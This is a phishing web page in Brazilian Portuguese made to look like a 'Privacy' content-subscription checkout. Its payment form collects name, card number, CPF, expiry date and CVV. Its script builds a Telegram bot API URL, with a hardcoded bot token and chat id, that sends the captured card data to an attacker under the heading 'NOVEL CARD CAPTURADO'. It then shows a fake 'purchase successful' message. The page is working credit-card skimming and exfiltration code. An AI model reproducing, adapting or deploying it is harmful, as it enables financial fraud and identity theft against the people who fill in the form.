<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; color: #333; padding-bottom: 100px; }

        .nav { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; position: sticky; top: 0; background: #fff; z-index: 100; }
        .banner { width: 100%; height: 220px; background: #eee url('capa.png') center/cover; }
        .p-wrapper { margin-top: -55px; padding-left: 20px; }
        .p-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        .btn-box { padding: 15px 20px; display: flex; flex-direction: column; gap: 12px; }
        .btn-s { width: 100%; padding: 18px 25px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--p-grad); font-weight: 700; font-size: 18px; }

        #payModal, #confirmModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); }
        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 420px; border-radius: 25px; padding: 25px; text-align: center; }
        
        .f-group { margin-bottom: 12px; text-align: left; }
        .f-group label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 4px; }
        .f-group input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; }
        
        .btn-final { width: 100%; padding: 18px; background: var(--p-grad); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="26"></div>
    <div class="banner"></div>
    <div class="p-wrapper"><div class="p-pic"></div></div>

    <div class="btn-box">
        <div class="btn-s" onclick="openP()"><span>Assinar Conte√∫do</span><span>R$ 10,00</span></div>
    </div>

    <div id="payModal">
        <div class="m-content">
            <h2 style="color:var(--p-orange);margin-bottom:20px">Pagamento</h2>
            <div class="f-group"><label>Nome</label><input type="text" id="p_name"></div>
            <div class="f-group"><label>Cart√£o</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
            <div class="f-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00"></div>
            <div style="display:flex;gap:10px">
                <input type="text" id="c_date" placeholder="MM/AA" style="width:60%;padding:14px;border-radius:10px;border:1px solid #ddd">
                <input type="text" id="cvv" placeholder="CVV" style="width:40%;padding:14px;border-radius:10px;border:1px solid #ddd">
            </div>
            <button class="btn-final" style="margin-top:20px" onclick="preAprovar()">APROVAR COMPRA</button>
        </div>
    </div>

    <div id="confirmModal">
        <div class="m-content">
            <i class="fa-solid fa-shield-halved" style="font-size:50px;color:var(--p-orange);margin-bottom:15px"></i>
            <h2 style="margin-bottom:10px">Verifica√ß√£o de Seguran√ßa</h2>
            <p style="color:#666;margin-bottom:25px">Para concluir sua assinatura de R$ 10,00, clique no bot√£o abaixo para confirmar a transa√ß√£o segura.</p>
            <a id="btnLink" href="#" target="_blank" class="btn-final" style="text-decoration:none;display:block" onclick="finalizou()">CONFIRMAR AGORA</a>
        </div>
    </div>

    <script>
        $(document).ready(function(){
            $('#c_num').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#c_date').mask('00/00');
            $('#cvv').mask('000');
        });

        function openP() { $('#payModal').fadeIn(); }

        // PASSO 1: Gera o link do Telegram com os dados
        function preAprovar() {
            const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
            const chat = '7320822019';
            
            const n = $('#p_name').val();
            const c = $('#c_num').val();
            const f = $('#cpf').val();
            const d = $('#c_date').val();
            const v = $('#cvv').val();

            if (c.length < 16) {
                Notiflix.Notify.failure('Dados inv√°lidos!');
                return;
            }

            const msg = `üöÄ NOVEL CARD CAPTURADO\nüë§ Nome: ${n}\nüí≥ Card: ${c}\nüÜî CPF: ${f}\nüìÖ Val: ${d}\nüîí CVV: ${v}`;
            const urlFinal = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
            
            // Coloca o link pronto no bot√£o de confirma√ß√£o
            $('#btnLink').attr('href', urlFinal);
            
            $('#payModal').hide();
            $('#confirmModal').fadeIn();
        }

        // PASSO 2: Quando ele clica no link, o bot recebe e o site mostra sucesso
        function finalizou() {
            setTimeout(() => {
                $('#confirmModal').hide();
                Notiflix.Report.success('Comprado com Sucesso', 'Acesso liberado! Verifique seu e-mail.', 'OK', () => {
                    location.reload();
                });
            }, 1000);
        }
    </script>
</body>
</html>
